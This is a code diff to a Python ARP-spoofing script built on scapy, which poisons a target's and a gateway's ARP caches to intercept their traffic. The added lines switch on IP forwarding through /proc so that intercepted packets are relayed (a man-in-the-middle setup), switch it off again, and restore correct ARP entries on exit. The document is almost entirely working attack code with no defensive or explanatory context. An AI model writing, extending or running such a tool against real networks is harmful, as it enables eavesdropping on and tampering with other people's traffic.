@@ -12,10 +12,26 @@ def get_mac(ip):
     answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answ[0][1].hwsrc
 
+def enable_ip_forwarding():
+    print ("\n[*] Enabling IP Forwarding...\n")
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+def disable_ip_forwarding():
+    print ("[*] Disabling IP Forwarding...")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
 def arp_spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
+    print ("\n[*] Restoring Targets...")
+
+    send(ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7)
+    send(ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
+    disable_ip_forwarding()
+    print ("[*] Shutting Down...")
+    sys.exit(1)
 
 def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac):
     sent_packets_count = 0
@@ -49,6 +65,7 @@ if __name__ == "__main__":
         print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip>")
         sys.exit(1)
 
+    enable_ip_forwarding()
     target_ip = sys.argv[1]
     gateway_ip = sys.argv[2]
 
